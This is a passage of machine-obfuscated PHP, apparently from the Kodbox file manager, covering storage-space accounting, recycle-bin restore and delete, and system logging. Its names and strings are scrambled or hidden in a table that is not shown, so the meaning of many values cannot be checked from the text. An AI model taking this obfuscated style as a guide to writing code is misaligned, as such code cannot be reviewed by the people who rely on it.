ëÌ€ù[$¾òùıêĞ[76]]; } } } $­šğ²ŸÚ = array(); foreach ($éÍ¡²Âä as $ ëÌ€ù) { if ($ ëÌ€ù[$¾òùıêĞ[76]] == $ ëÌ€ù[$¾òùıêĞ[2168]]) { continue; } $­šğ²ŸÚ[] = array($¾òùıêĞ[402], $ ëÌ€ù[$¾òùıêĞ[402]], $¾òùıêĞ[76], $ ëÌ€ù[$¾òùıêĞ[76]]); } $this->saveAll($­šğ²ŸÚ); } public function userSpaceReset($­º‰ı™š = false) { $üµüûÖÖ =& $_SERVER[Ã¶¡¶„æ]; $¶ÒÄêè¼ = $this->where(array($üµüûÖÖ[411] => self::TYPE_USER, $üµüûÖÖ[505] => $­º‰ı™š, $üµüûÖÖ[410] => 0))->sum($üµüûÖÖ[76]); $¶ÒÄêè¼ = !$¶ÒÄêè¼ || $¶ÒÄêè¼ <= 0 ? 0 : $¶ÒÄêè¼; Model($üµüûÖÖ[513])->userEdit($­º‰ı™š, array($üµüûÖÖ[1854] => $¶ÒÄêè¼)); } public function targetSpaceUpdate($ƒİ¨ÖÕÉ, $ùˆ¼»–ş) { $Ö˜§¹ºû =& $_SERVER[Ã¶¡¶„æ]; if (!$ùˆ¼»–ş) { return; } if (!in_array($ƒİ¨ÖÕÉ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ë™¹¬É› = $this->targetSpaceSize($ƒİ¨ÖÕÉ, $ùˆ¼»–ş); if ($ƒİ¨ÖÕÉ == self::TYPE_USER) { Model($Ö˜§¹ºû[513])->userEdit($ùˆ¼»–ş, array($Ö˜§¹ºû[1854] => $ë™¹¬É›)); } else { if ($ƒİ¨ÖÕÉ == self::TYPE_GROUP) { Model($Ö˜§¹ºû[522])->groupEdit($ùˆ¼»–ş, array($Ö˜§¹ºû[1854] => $ë™¹¬É›)); } } } public function targetSpaceSize($ÍŸóŸâÛ, $…úÊ‰µÇ) { $ÎÀÈ·òØ =& $_SERVER[Ã¶¡¶„æ]; $¸†•»»Ã = 0; $Šı¸™Ç• = $this->targetSourceRoot($ÍŸóŸâÛ, $…úÊ‰µÇ, !0); foreach ($Šı¸™Ç• as $³ãæ¦Šä) { if (!$³ãæ¦Šä) { continue; } $¸†•»»Ã += floatval($³ãæ¦Šä[$ÎÀÈ·òØ[76]]); $Âˆ­¿¸ó = array($ÎÀÈ·òØ[590] => array($ÎÀÈ·òØ[550], $ÎÀÈ·òØ[531] . $³ãæ¦Šä[$ÎÀÈ·òØ[402]] . $ÎÀÈ·òØ[551])); $Ä«ıáñ = Model($ÎÀÈ·òØ[429])->field($ÎÀÈ·òØ[417])->where($Âˆ­¿¸ó)->select(); $Ä«ıáñ = array_to_keyvalue($Ä«ıáñ, $ÎÀÈ·òØ[12], $ÎÀÈ·òØ[402]); $Ä«ıáñ = array_unique(array_filter($Ä«ıáñ)); if ($Ä«ıáñ) { $Âˆ­¿¸ó = array($ÎÀÈ·òØ[417] => array($ÎÀÈ·òØ[418], $Ä«ıáñ)); $¸†•»»Ã += floatval($this->where($Âˆ­¿¸ó)->sum($ÎÀÈ·òØ[76])); } } $¸†•»»Ã = !$¸†•»»Ã || $¸†•»»Ã <= 0 ? 0 : $¸†•»»Ã; return $¸†•»»Ã; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($çœ®÷°) { return $this->fileTypeProfile($çœ®÷°, SourceModel::TYPE_USER); } public function groupFileTypeProfile($”ˆº¾Äª) { return $this->fileTypeProfile($”ˆº¾Äª, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¬Ö÷ÚÊ, $Ğ†Ùª¼) { $Ì¥€Ç =& $_SERVER[Ã¶¡¶„æ]; $Å¹æ’®« = $Ì¥€Ç[2169] . $¬Ö÷ÚÊ . $Ì¥€Ç[11] . $Ğ†Ùª¼; $Â¯ú„ÅÕ = Cache::get($Å¹æ’®«); if ($Â¯ú„ÅÕ) { return $Â¯ú„ÅÕ; } $–áŒÀî = array($Ì¥€Ç[583] => 0); if ($¬Ö÷ÚÊ != !1) { $–áŒÀî[$Ì¥€Ç[505]] = $¬Ö÷ÚÊ; $–áŒÀî[$Ì¥€Ç[411]] = $Ğ†Ùª¼; } $ÛÈöù î = array(); $ÛÈöù î[$Ì¥€Ç[2170]] = array($Ì¥€Ç[2171] => LNG($Ì¥€Ç[2170]), $Ì¥€Ç[2172] => $this->where($–áŒÀî)->count(), $Ì¥€Ç[585] => $this->where($–áŒÀî)->sum($Ì¥€Ç[76])); $àŒíŸ„à = KodIO::fileTypeList(); foreach ($àŒíŸ„à as $Êˆ‡°É => $¬Ï³«ì½) { $–áŒÀî[$Ì¥€Ç[412]] = $this->fileTypeWhere($Êˆ‡°É); $ÛÈöù î[$Êˆ‡°É] = array($Ì¥€Ç[2171] => $¬Ï³«ì½[$Ì¥€Ç[32]], $Ì¥€Ç[2172] => $this->where($–áŒÀî)->count(), $Ì¥€Ç[585] => $this->where($–áŒÀî)->sum($Ì¥€Ç[76])); } Cache::set($Å¹æ’®«, $ÛÈöù î, 1200); return $ÛÈöù î; } public function fileNameExist($õÒ²ó, $ıßÜèêæ) { $©¢ˆó¾ =& $_SERVER[Ã¶¡¶„æ]; $ÁªŒ¡™Õ = $this->where(array($©¢ˆó¾[432] => $õÒ²ó, $©¢ˆó¾[32] => $ıßÜèêæ, $©¢ˆó¾[431] => 0))->find(); return is_array($ÁªŒ¡™Õ) ? $ÁªŒ¡™Õ[$©¢ˆó¾[402]] : !1; } public function childList($¹¤×ÑÉ´) { $™øà÷œ =& $_SERVER[Ã¶¡¶„æ]; $£œªãªé = $™øà÷œ[2147] . $¹¤×ÑÉ´; if (isset(self::$cacheChildList[$£œªãªé])) { return self::$cacheChildList[$£œªãªé]; } $´ÃØ§‘í = array($™øà÷œ[432] => intval($¹¤×ÑÉ´), $™øà÷œ[431] => 0); $«ØéÓù˜ = $this->where($´ÃØ§‘í)->select(); $«ØéÓù˜ = $«ØéÓù˜ ? $«ØéÓù˜ : array(); self::$cacheChildList[$£œªãªé] = $«ØéÓù˜; foreach ($«ØéÓù˜ as $ÌÄˆÂ´¢) { $£œªãªé = $™øà÷œ[460] . $ÌÄˆÂ´¢[$™øà÷œ[402]]; self::$cacheSourceInfo[$£œªãªé] = $ÌÄˆÂ´¢; } return $«ØéÓù˜; } public function fileNameAuto($­ıò•ĞÌ, $É–“îÆ¿, $ãÁø¿’ = REPEAT_RENAME, $ï¢Í¾±Ò = false) { $­á‚ØÛ =& $_SERVER[Ã¶¡¶„æ]; $×à«À‘¾ = get_path_ext($É–“îÆ¿); $ÚÚ¦ˆˆª = $×à«À‘¾ ? basename($É–“îÆ¿, $­á‚ØÛ[10] . $×à«À‘¾) . $­á‚ØÛ[2173] . $×à«À‘¾ : $É–“îÆ¿ . $­á‚ØÛ[384]; $Ñİñ³Ú­ = array($­á‚ØÛ[432] => $­ıò•ĞÌ, $­á‚ØÛ[431] => 0, $­á‚ØÛ[32] => array($­á‚ØÛ[383], $ÚÚ¦ˆˆª)); $°çˆñ¦ä = $this->field($­á‚ØÛ[32])->where($Ñİñ³Ú­)->select(); $óš¹Æì­ = array_to_keyvalue($°çˆñ¦ä, $­á‚ØÛ[12], $­á‚ØÛ[32]); return $this->fileNameAutoGet($óš¹Æì­, $É–“îÆ¿, $ãÁø¿’, $ï¢Í¾±Ò); } public function fileNameAutoGet($¼İó¢§Ü, $ÚÚ¸²ÈÚ, $ìÔßâ»Ï, $ñË²ó) { $»åâöÊˆ =& $_SERVER[Ã¶¡¶„æ]; if ($ìÔßâ»Ï == REPEAT_REPLACE || !$¼İó¢§Ü || !in_array_not_case($ÚÚ¸²ÈÚ, $¼İó¢§Ü) || $ñË²ó && $ìÔßâ»Ï != REPEAT_RENAME_FOLDER) { return $ÚÚ¸²ÈÚ; } if ($ìÔßâ»Ï == REPEAT_SKIP) { return !1; } $ÄÄÖİ© = $»åâöÊˆ[10] . get_path_ext($ÚÚ¸²ÈÚ); $ÄÄÖİ© = $ÄÄÖİ© == $»åâöÊˆ[10] || $ñË²ó ? $»åâöÊˆ[12] : $ÄÄÖİ©; for ($íşçà = 1; $íşçà <= count($¼İó¢§Ü) + 1; $íşçà++) { $¯¸É´­ì = substr($ÚÚ¸²ÈÚ, 0, strlen($ÚÚ¸²ÈÚ) - strlen($ÄÄÖİ©)); $—¶¯Ü° = $¯¸É´­ì . "\50{$íşçà}\x29{$ÄÄÖİ©}"; if (!in_array_not_case($—¶¯Ü°, $¼İó¢§Ü)) { return $—¶¯Ü°; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\x72\143\x65\x5f\x72\x65\143\171\x63\x6c\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\x54\151\x6d\x65", "\164\151\x6d\x65", "\151\x6e\163\x65\162\x74", "\146\x75\x6e\143\x74\151\x6f\156")); public function listData($µóœ¦Â… = false) { $şû¨‰ø =& $_SERVER[Ã¶¡¶„æ]; $µóœ¦Â… = $µóœ¦Â… ? $µóœ¦Â… : USER_ID; $ûÛ€‘İ = $this->where(array($şû¨‰ø[1667] => $µóœ¦Â…))->select(); return array_to_keyvalue($ûÛ€‘İ, $şû¨‰ø[12], $şû¨‰ø[402]); } public function moveToRecycle($÷ó‰İªë) { $‰•ñÚÇÓ =& $_SERVER[Ã¶¡¶„æ]; $¾™–šµŒ = Model($‰•ñÚÇÓ[1350]); $…ş‡¡Ç¦ = $¾™–šµŒ->sourceInfo($÷ó‰İªë); if (!$…ş‡¡Ç¦ || $…ş‡¡Ç¦[$‰•ñÚÇÓ[431]] == $‰•ñÚÇÓ[88]) { return; } $êóíÄ‹í = array($‰•ñÚÇÓ[417] => $÷ó‰İªë, $‰•ñÚÇÓ[1667] => USER_ID, $‰•ñÚÇÓ[586] => $…ş‡¡Ç¦[$‰•ñÚÇÓ[411]], $‰•ñÚÇÓ[587] => $…ş‡¡Ç¦[$‰•ñÚÇÓ[505]], $‰•ñÚÇÓ[590] => $…ş‡¡Ç¦[$‰•ñÚÇÓ[521]]); $this->add($êóíÄ‹í); $this->recycleMove($÷ó‰İªë, 1); if ($…ş‡¡Ç¦[$‰•ñÚÇÓ[410]] == $‰•ñÚÇÓ[88]) { $¡“ê’Ó = array($‰•ñÚÇÓ[590] => array($‰•ñÚÇÓ[550], $…ş‡¡Ç¦[$‰•ñÚÇÓ[521]] . $÷ó‰İªë . $‰•ñÚÇÓ[551])); $¾™–šµŒ->where($¡“ê’Ó)->setField($‰•ñÚÇÓ[431], 1); } } public function clear() { $this->remove(!1); } public function remove($äòæßÉ = false, $ÑÈ¢š³õ = false) { $ÄÌšÕÍ‘ =& $_SERVER[Ã¶¡¶„æ]; $ÑÈ¢š³õ = $ÑÈ¢š³õ ? $ÑÈ¢š³õ : USER_ID; $£Ö€˜µò = Model($ÄÌšÕÍ‘[1350]); $ûğ¤ÚÅ = $this->listData($ÑÈ¢š³õ); $äòæßÉ = $äòæßÉ === !1 ? !1 : $äòæßÉ; $Şì¯©¸œ = array(); foreach ($ûğ¤ÚÅ as $…÷ÌöÎ) { if ($äòæßÉ != !1 && !in_array($…÷ÌöÎ, $äòæßÉ)) { continue; } $Ğ‡í…šŞ = $£Ö€˜µò->sourceInfo($…÷ÌöÎ); $£Ö€˜µò->remove($…÷ÌöÎ, !1); $éÖæı±İ = $Ğ‡í…šŞ[$ÄÌšÕÍ‘[411]] . $ÄÌšÕÍ‘[11] . $Ğ‡í…šŞ[$ÄÌšÕÍ‘[505]]; $Şì¯©¸œ[$éÖæı±İ] = array($ÄÌšÕÍ‘[586] => $Ğ‡í…šŞ[$ÄÌšÕÍ‘[411]], $ÄÌšÕÍ‘[505] => $Ğ‡í…šŞ[$ÄÌšÕÍ‘[505]]); $this->where(array($ÄÌšÕÍ‘[402] => $…÷ÌöÎ))->delete(); } foreach ($Şì¯©¸œ as $Œ•ÉüÎœ) { $£Ö€˜µò->targetSpaceUpdate($Œ•ÉüÎœ[$ÄÌšÕÍ‘[411]], $Œ•ÉüÎœ[$ÄÌšÕÍ‘[505]]); } } public function restore($çã×÷«² = false) { $º¡Ê– = $this->listData(); $this->_restoreSource($º¡Ê–, $çã×÷«²); } public function removeUserAll($–†Ä‘·¶) { $this->remove(!1, $–†Ä‘·¶); } private function _restoreSource($™üÂÌ«š, $ÂêóÓ½¼) { $ì½äí‚Ê =& $_SERVER[Ã¶¡¶„æ]; $Ñ¢öëŸÜ = Model($ì½äí‚Ê[1350]); $ÂêóÓ½¼ = $ÂêóÓ½¼ == !1 ? !1 : $ÂêóÓ½¼; if (!$™üÂÌ«š) { return !0; } $¤¬÷øß = array(); foreach ($™üÂÌ«š as $é•ëÓİÚ) { if ($ÂêóÓ½¼ != !1 && !in_array($é•ëÓİÚ, $ÂêóÓ½¼)) { continue; } $²§’Û’– = $Ñ¢öëŸÜ->sourceInfo($é•ëÓİÚ); $şáÑòİ = $Ñ¢öëŸÜ->sourceInfo($²§’Û’–[$ì½äí‚Ê[432]]); if ($şáÑòİ[$ì½äí‚Ê[431]] == $ì½äí‚Ê[88]) { continue; } $Ñ¢öëŸÜ->lockMoveStart($é•ëÓİÚ); $this->recycleMove($é•ëÓİÚ, 0); if ($²§’Û’–[$ì½äí‚Ê[410]] == $ì½äí‚Ê[88]) { $“íÖ…°ƒ = array($ì½äí‚Ê[590] => array($ì½äí‚Ê[550], $²§’Û’–[$ì½äí‚Ê[521]] . $é•ëÓİÚ . $ì½äí‚Ê[551])); $Ñ¢öëŸÜ->where($“íÖ…°ƒ)->setField($ì½äí‚Ê[431], 0); $this->restoreFolderChildren($é•ëÓİÚ, $™üÂÌ«š); } $this->where(array($ì½äí‚Ê[402] => $é•ëÓİÚ))->delete(); $Ñ¢öëŸÜ->folderSizeReset($²§’Û’–[$ì½äí‚Ê[432]]); $¤¬÷øß[] = $²§’Û’–[$ì½äí‚Ê[432]]; if ($²§’Û’–[$ì½äí‚Ê[410]] == $ì½äí‚Ê[88]) { $¤¬÷øß[] = $é•ëÓİÚ; } $Ñ¢öëŸÜ->lockMoveEnd($é•ëÓİÚ); } $Ñ¢öëŸÜ->updateModifyTime($¤¬÷øß); } private function restoreFolderChildren($œ¢ˆ›œÛ, $ìë¦‹“·) { $¿ÄöÂâû =& $_SERVER[Ã¶¡¶„æ]; $ŒÇøê = Model($¿ÄöÂâû[1350]); $¬Ú‡¦° = array($¿ÄöÂâû[402] => array($¿ÄöÂâû[7], array())); foreach ($ìë¦‹“· as $¬Ğú¬şä) { if ($¬Ğú¬şä == $œ¢ˆ›œÛ) { continue; } if (!$ŒÇøê->isParentOf($œ¢ˆ›œÛ, $¬Ğú¬şä)) { continue; } $àŒßè‚Õ = $ŒÇøê->sourceInfo($¬Ğú¬şä); if ($àŒßè‚Õ[$¿ÄöÂâû[410]] == $¿ÄöÂâû[88]) { $¬Ú‡¦°[] = array($¿ÄöÂâû[590] => array($¿ÄöÂâû[550], $àŒßè‚Õ[$¿ÄöÂâû[521]] . $¬Ğú¬şä . $¿ÄöÂâû[551])); } else { $¬Ú‡¦°[$¿ÄöÂâû[402]][1][] = $¬Ğú¬şä; } } if (!$¬Ú‡¦°[$¿ÄöÂâû[402]][1]) { unset($¬Ú‡¦°[$¿ÄöÂâû[402]]); } if (!$¬Ú‡¦°) { return; } $¬Ú‡¦°[$¿ÄöÂâû[402]][1] = array_unique($¬Ú‡¦°[$¿ÄöÂâû[402]][1]); $¬Ú‡¦°[$¿ÄöÂâû[1014]] = $¿ÄöÂâû[1963]; $ŒÇøê->where($¬Ú‡¦°)->setField($¿ÄöÂâû[431], 1); } private function recycleMove($ÕÆ¿¦š±, $©‹˜ÀÒ = 1) { $¤Ò¬Ùş‘ =& $_SERVER[Ã¶¡¶„æ]; $ÆãÍ‰ = Model($¤Ò¬Ùş‘[1350]); $ı˜íÈØû = Model($¤Ò¬Ùş‘[2174]); $Éú¯‘Ô = array($¤Ò¬Ùş‘[402] => $ÕÆ¿¦š±); if ($©‹˜ÀÒ) { $ÆãÍ‰->where($Éú¯‘Ô)->setField($¤Ò¬Ùş‘[431], 1); $ı˜íÈØû->eventRecycle($ÕÆ¿¦š±, $¤Ò¬Ùş‘[2175]); } else { $™›ÃìÂÒ = $ÆãÍ‰->where($Éú¯‘Ô)->find(); $‘ìÄ´× = $™›ÃìÂÒ[$¤Ò¬Ùş‘[410]] == $¤Ò¬Ùş‘[88]; $‡¯”£Æ = $ÆãÍ‰->fileNameAuto($™›ÃìÂÒ[$¤Ò¬Ùş‘[432]], $™›ÃìÂÒ[$¤Ò¬Ùş‘[32]], REPEAT_RENAME_FOLDER, $‘ìÄ´×); if ($‡¯”£Æ != $™›ÃìÂÒ[$¤Ò¬Ùş‘[32]]) { $ÆãÍ‰->rename($ÕÆ¿¦š±, $‡¯”£Æ); } $ÆãÍ‰->where($Éú¯‘Ô)->setField($¤Ò¬Ùş‘[431], 0); $ı˜íÈØû->eventRecycle($ÕÆ¿¦š±, $¤Ò¬Ùş‘[2176]); } } } goto dåÁÆ¸Ùá¼; b•»µ•¯Î¢: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\x6d\137\154\x6f\x67"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\124\151\155\x65", "\164\151\155\145", "\151\156\x73\x65\162\x74", "\146\x75\156\x63\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $³ƒÁ°¶‰ =& $_SERVER[Ã¶¡¶„æ]; return array($³ƒÁ°¶‰[2193] => LNG($³ƒÁ°¶‰[2194]), $³ƒÁ°¶‰[2195] => LNG($³ƒÁ°¶‰[2196]), $³ƒÁ°¶‰[1808] => LNG($³ƒÁ°¶‰[2197]), $³ƒÁ°¶‰[2198] => LNG($³ƒÁ°¶‰[2199]), $³ƒÁ°¶‰[2200] => LNG($³ƒÁ°¶‰[2201]), $³ƒÁ°¶‰[2202] => LNG($³ƒÁ°¶‰[2203]), $³ƒÁ°¶‰[2204] => LNG($³ƒÁ°¶‰[2205]), $³ƒÁ°¶‰[1838] => LNG($³ƒÁ°¶‰[2205]), $³ƒÁ°¶‰[1839] => LNG($³ƒÁ°¶‰[2206]), $³ƒÁ°¶‰[2207] => LNG($³ƒÁ°¶‰[2208]), $³ƒÁ°¶‰[2209] => LNG($³ƒÁ°¶‰[2210]), $³ƒÁ°¶‰[2211] => LNG($³ƒÁ°¶‰[2212]), $³ƒÁ°¶‰[2213] => LNG($³ƒÁ°¶‰[2214]), $³ƒÁ°¶‰[1836] => LNG($³ƒÁ°¶‰[2215]), $³ƒÁ°¶‰[2216] => LNG($³ƒÁ°¶‰[2217]), $³ƒÁ°¶‰[1843] => LNG($³ƒÁ°¶‰[2218]), $³ƒÁ°¶‰[2219] => LNG($³ƒÁ°¶‰[2220]), $³ƒÁ°¶‰[2221] => LNG($³ƒÁ°¶‰[2222]), $³ƒÁ°¶‰[2223] => LNG($³ƒÁ°¶‰[2224]), $³ƒÁ°¶‰[2225] => LNG($³ƒÁ°¶‰[2226]), $³ƒÁ°¶‰[1846] => LNG($³ƒÁ°¶‰[2227]), $³ƒÁ°¶‰[1847] => LNG($³ƒÁ°¶‰[2228]), $³ƒÁ°¶‰[2229] => LNG($³ƒÁ°¶‰[2230]), $³ƒÁ°¶‰[2231] => LNG($³ƒÁ°¶‰[2232]), $³ƒÁ°¶‰[2233] => LNG($³ƒÁ°¶‰[2234]), $³ƒÁ°¶‰[1841] => LNG($³ƒÁ°¶‰[2235]), $³ƒÁ°¶‰[2236] => LNG($³ƒÁ°¶‰[2237]), $³ƒÁ°¶‰[1840] => LNG($³ƒÁ°¶‰[2238]), $³ƒÁ°¶‰[2239] => LNG($³ƒÁ°¶‰[2240]), $³ƒÁ°¶‰[2241] => LNG($³ƒÁ°¶‰[2242]), $³ƒÁ°¶‰[2243] => LNG($³ƒÁ°¶‰[2244]), $³ƒÁ°¶‰[2245] => LNG($³ƒÁ°¶‰[2245]), $³ƒÁ°¶‰[2246] => LNG($³ƒÁ°¶‰[1812]), $³ƒÁ°¶‰[2247] => LNG($³ƒÁ°¶‰[2248]), $³ƒÁ°¶‰[2249] => LNG($³ƒÁ°¶‰[2250]), $³ƒÁ°¶‰[2251] => LNG($³ƒÁ°¶‰[2252]), $³ƒÁ°¶‰[2253] => LNG($³ƒÁ°¶‰[2254]), $³ƒÁ°¶‰[2255] => LNG($³ƒÁ°¶‰[2256]), $³ƒÁ°¶‰[2257] => LNG($³ƒÁ°¶‰[2257]), $³ƒÁ°¶‰[2258] => LNG($³ƒÁ°¶‰[2259]), $³ƒÁ°¶‰[2260] => LNG($³ƒÁ°¶‰[2261]), $³ƒÁ°¶‰[2262] => LNG($³ƒÁ°¶‰[2263]), $³ƒÁ°¶‰[2264] => LNG($³ƒÁ°¶‰[2265]), $³ƒÁ°¶‰[2266] => LNG($³ƒÁ°¶‰[2267]), $³ƒÁ°¶‰[2268] => LNG($³ƒÁ°¶‰[2269])); } private function typeFile() { $ÓÏ¼šÖŞ =& $_SERVER[Ã¶¡¶„æ]; $°ş‘ÕË« = array($ÓÏ¼šÖŞ[1843] => array($ÓÏ¼šÖŞ[1844]), $ÓÏ¼šÖŞ[2211] => array($ÓÏ¼šÖŞ[2270]), $ÓÏ¼šÖŞ[2213] => array($ÓÏ¼šÖŞ[2271]), $ÓÏ¼šÖŞ[1836] => array($ÓÏ¼šÖŞ[1837]), $ÓÏ¼šÖŞ[2221] => array(), $ÓÏ¼šÖŞ[2223] => array(), $ÓÏ¼šÖŞ[2225] => array(), $ÓÏ¼šÖŞ[1846] => array($ÓÏ¼šÖŞ[1848]), $ÓÏ¼šÖŞ[1847] => array($ÓÏ¼šÖŞ[1848]), $ÓÏ¼šÖŞ[2229] => array($ÓÏ¼šÖŞ[2272]), $ÓÏ¼šÖŞ[2231] => array($ÓÏ¼šÖŞ[2272]), $ÓÏ¼šÖŞ[2233] => array($ÓÏ¼šÖŞ[2273]), $ÓÏ¼šÖŞ[2219] => array($ÓÏ¼šÖŞ[2274]), $ÓÏ¼šÖŞ[1841] => array($ÓÏ¼šÖŞ[2275]), $ÓÏ¼šÖŞ[2236] => array($ÓÏ¼šÖŞ[2276]), $ÓÏ¼šÖŞ[1840] => array($ÓÏ¼šÖŞ[1842])); return $°ş‘ÕË«; } private function typeAll() { $Äô‹Ô¯™ =& $_SERVER[Ã¶¡¶„æ]; $²–Úêœ = $this->typeList; $»§Æ˜Ş = array_filter($this->typeFile()); foreach ($»§Æ˜Ş as $‡óØ¹¡ => $²ÄÓãÛÁ) { $²–Úêœ[$²ÄÓãÛÁ[0]] = $²–Úêœ[$‡óØ¹¡]; } $²–Úêœ[$Äô‹Ô¯™[1848]] = LNG($Äô‹Ô¯™[2277]); $²–Úêœ[$Äô‹Ô¯™[2272]] = LNG($Äô‹Ô¯™[2278]); return $²–Úêœ; } public function addLog($İô¹ˆ€², $ğ·±àæŸ = array()) { $ÕìµÚ§  =& $_SERVER[Ã¶¡¶„æ]; if (!isset($this->typeList[$İô¹ˆ€²])) { return; } $–òãá¬Ñ = defined($ÕìµÚ§ [475]) && USER_ID ? USER_ID : (isset($ğ·±àæŸ[$ÕìµÚ§ [1676]]) ? $ğ·±àæŸ[$ÕìµÚ§ [1676]] : 0); if (!$–òãá¬Ñ) { $–òãá¬Ñ = (int) Session::get($ÕìµÚ§ [2002]); } if ($İô¹ˆ€² == $ÕìµÚ§ [2247] && is_array($ğ·±àæŸ[$ÕìµÚ§ [2279]]) && !$ğ·±àæŸ[$ÕìµÚ§ [2279]]) { return; } $À™ÎÉ­ = get_client_ip(); if (!$ğ·±àæŸ || strlen(json_encode($ğ·±àæŸ)) >= 1024) { $ğ·±àæŸ = array($ÕìµÚ§ [2280] => $À™ÎÉ­); } else { if (is_array($ğ·±àæŸ)) { $ğ·±àæŸ[$ÕìµÚ§ [2280]] = $À™ÎÉ­; } else { $ğ·±àæŸ = array($ÕìµÚ§ [1217] => $ğ·±àæŸ, $ÕìµÚ§ [2280] => $À™ÎÉ­); } } $ğ·±àæŸ = array($ÕìµÚ§ [1666] => Session::sign(), $ÕìµÚ§ [1667] => $–òãá¬Ñ, $ÕìµÚ§ [33] => $İô¹ˆ€², $ÕìµÚ§ [1669] => json_encode($ğ·±àæŸ)); parent::add($ğ·±àæŸ); } public function remove($€Ú„’–ó) { $this->where(array($_SERVER[Ã¶¡¶„æ][419] => $€Ú„’–ó))->delete(); } private function _makeOrder($—……ûôÎ = '') { $Í†€™¼Ö =& $_SERVER[Ã¶¡¶„æ]; $Ù´ø’Şñ = $Í†€™¼Ö[200]; $´Ó‹ı®´ = array($Í†€™¼Ö[450] => $Í†€™¼Ö[451], $Í†€™¼Ö[452] => $Í†€™¼Ö[453]); $­áå²á = Input::get($Í†€™¼Ö[458], $Í†€™¼Ö[7], $Í†€™¼Ö[2034], array($Í†€™¼Ö[1956], $Í†€™¼Ö[452])); $­áå²á = $´Ó‹ı®´[$­áå²á]; $—……ûôÎ = $—……ûôÎ . "{$Ù´ø’Şñ}\40{$­áå²á}"; return $this->order($—……ûôÎ); } public function get($›òäŸèÇ = '') { $ßğ±ÄŠ =& $_SERVER[Ã¶¡¶„æ]; if (!$›òäŸèÇ) { show_json(array()); } $Êú§øš› = array(); if ($›òäŸèÇ[$ßğ±ÄŠ[1676]]) { $Êú§øš›[$ßğ±ÄŠ[1676]] = $›òäŸèÇ[$ßğ±ÄŠ[1676]]; } if (isset($›òäŸèÇ[$ßğ±ÄŠ[767]])) { $œÎÅœ¤ = $›òäŸèÇ[$ßğ±ÄŠ[767]]; $äÆ©¦Ş = isset($›òäŸèÇ[$ßğ±ÄŠ[497]]) ? $›òäŸèÇ[$ßğ±ÄŠ[497]] : time(); $Êú§øš›[$ßğ±ÄŠ[200]] = array($ßğ±ÄŠ[333], array($œÎÅœ¤, $äÆ©¦Ş)); } if ($›òäŸèÇ[$ßğ±ÄŠ[33]]) { $Ì‹õ“ï¨ = explode($ßğ±ÄŠ[50], $›òäŸèÇ[$ßğ±ÄŠ[33]]); $‰©Ö ×å = $this->typeFile(); $˜—æª¶‹ = array(); foreach ($Ì‹õ“ï¨ as $ƒäû¢¨‹) { $˜—æª¶‹[] = $ƒäû¢¨‹; if (isset($‰©Ö ×å[$ƒäû¢¨‹])) { $˜—æª¶‹ = array_merge($˜—æª¶‹, $‰©Ö ×å[$ƒäû¢¨‹]); } } $˜—æª¶‹ = array_unique($˜—æª¶‹); if ($˜—æª¶‹) { $Êú§øš›[$ßğ±ÄŠ[33]] = array($ßğ±ÄŠ[7], $˜—æª¶‹); } } else { $Êú§øš›[$ßğ±ÄŠ[33]] = array($ßğ±ÄŠ[2281], $ßğ±ÄŠ[2282]); } if (!empty($›òäŸèÇ[$ßğ±ÄŠ[2280]])) { $Êú§øš›[$ßğ±ÄŠ[453]] = array($ßğ±ÄŠ[383], "\45{$›òäŸèÇ[$ßğ±ÄŠ[2280]]}\x25"); } $¡Ø³ãÆ– = $this->_makeOrder()->where($Êú§øš›)->selectPage(); if (empty($¡Ø³ãÆ–[$ßğ±ÄŠ[369]])) { show_json(array(), !0, $¡Ø³ãÆ–[$ßğ±ÄŠ[366]]); } $¡Ø³ãÆ–[$ßğ±ÄŠ[369]] = $this->logList($¡Ø³ãÆ–[$ßğ±ÄŠ[369]]); return $¡Ø³ãÆ–; } private function ipAddress(&$œïÀóÎ) { $ŠàÆ…ô“ =& $_SERVER[Ã¶¡¶„æ]; if (!empty($œïÀóÎ[$ŠàÆ…ô“[2280]])) { $“ÑÙÈ” = IpLocation::get($œïÀóÎ[$ŠàÆ…ô“[2280]]); } else { $“ÑÙÈ” = LNG($ŠàÆ…ô“[2283]); } $œïÀóÎ[$ŠàÆ…ô“[2284]] = $“ÑÙÈ”; } private function descZipDownload($¤Š¬±Ç¤, &$Ûğ÷ƒš) { $‡²§âºİ =& $_SERVER[Ã¶¡¶„æ]; if (!isset($¤Š¬±Ç¤[$‡²§âºİ[2285]])) { return; } $Øú‘—™Ü = json_decode($¤Š¬±Ç¤[$‡²§âºİ[2285]], !0); foreach ($Øú‘—™Ü as $úÊªä¸Á) { try { $şñ©Ë‰ë = IO::infoFull($úÊªä¸Á[$‡²§âºİ[84]]); } catch (Exception $ÀİäÙ—Õ) { continue; } $¤Š¬±Ç¤[$‡²§âºİ[84]] = $úÊªä¸Á[$‡²§âºİ[84]]; $Ûğ÷ƒš[] = $¤Š¬±Ç¤[$‡²§âºİ[402]] = $şñ©Ë‰ë[$‡²§âºİ[402]]; $Ûğ÷ƒš[] = $¤Š¬±Ç¤[$‡²§âºİ[2088]] = $şñ©Ë‰ë[$‡²§âºİ[432]]; break; } return $¤Š¬±Ç¤; } private function getSourceList(&$á¨’İ¢) { $ÅÄ£ì•ñ =& $_SERVER[Ã¶¡¶„æ]; $Øå¹¦Õ” = array(); foreach ($á¨’İ¢ as $´æÍö ³ => $Ù²àİğæ) { $øªÏ£Ìµ = json_decode($Ù²àİğæ[$ÅÄ£ì•ñ[453]], !0); if ($Ù²àİğæ[$ÅÄ£ì•ñ[33]] == $ÅÄ£ì•ñ[1839]) { $øªÏ£Ìµ = $this->descZipDownload($øªÏ£Ìµ, $Øå¹¦Õ”); $á¨’İ¢[$´æÍö ³][$ÅÄ£ì•ñ[453]] = json_encode($øªÏ£Ìµ); continue; } if (strpos($Ù²àİğæ[$ÅÄ£ì•ñ[33]], $ÅÄ£ì•ñ[2090]) !== 0) { if (!isset($øªÏ£Ìµ[$ÅÄ£ì•ñ[84]]) || strpos($Ù²àİğæ[$ÅÄ£ì•ñ[33]], $ÅÄ£ì•ñ[2286]) !== 0) { continue; } try { 